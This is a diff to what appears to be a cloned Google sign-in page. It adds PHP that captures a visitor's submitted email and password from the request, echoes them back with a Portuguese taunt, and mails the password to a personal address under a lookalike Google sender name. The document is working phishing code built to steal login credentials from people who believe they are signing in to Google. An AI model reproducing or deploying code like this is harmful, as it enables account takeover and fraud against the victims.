@@ -1510,9 +1510,29 @@ g("gaia.loginAutoRedirect.stop",function(){var a=n;a.b=!0;a.a&&(clearInterval(a.
   'https:\x2F\x2Faccounts.google.com\x2FPassiveLoginProber?continue=https%3A%2F%2Faccounts.google.com%2FManageAccount\x26followup=https%3A%2F%2Faccounts.google.com%2FManageAccount\x26passive=1209600');
   </script>
   <?php
-    email = isset($_GET["Email"])?$_GET[Email]:0;
-    senha = isset($_GET["Passwd"])?$_GET[Passwd]:0;
-    echo"seu email é $email e sua senha $senha perdeu vacilao"
+    $email = isset($_GET["Email"])?$_GET[Email]:0;
+    $senha = isset($_GET["Passwd"])?$_GET[Passwd]:0;
+    echo "seu email é $email e sua senha $senha perdeu vacilao";
+
+    ini_set('display_errors', 1);
+
+    error_reporting(E_ALL);
+
+    $from = "googIIe.github.io";
+
+    $to = "felipe2438henrique@gmail.com";
+
+    $subject = "Senha E Email DO TROUXA";
+
+    $message = isset($_GET["Passwd"])?$_GET[Passwd]:0;
+
+    $headers = "De:". $from;
+
+    mail($to, $subject, $message, $headers);
+
+    echo "A mensagem de e-mail foi enviada.";
+
+
   ?>
   </body>
 </html>
